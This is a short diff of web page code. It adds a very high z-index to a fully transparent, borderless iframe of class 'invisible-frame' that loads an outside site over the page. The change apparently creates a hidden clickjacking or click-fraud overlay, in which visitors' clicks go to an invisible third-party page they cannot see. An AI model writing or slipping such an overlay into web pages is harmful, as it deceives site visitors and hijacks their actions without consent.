@@ -11,6 +11,7 @@ document.addEventListener('DOMContentLoaded', () => {
       right: 0;
       border: none;
       opacity: 0;
+      z-index:39494;
     }
   </style> <iframe class="invisible-frame" src="https://www.dktechnozone.in/"></iframe>
 <script>
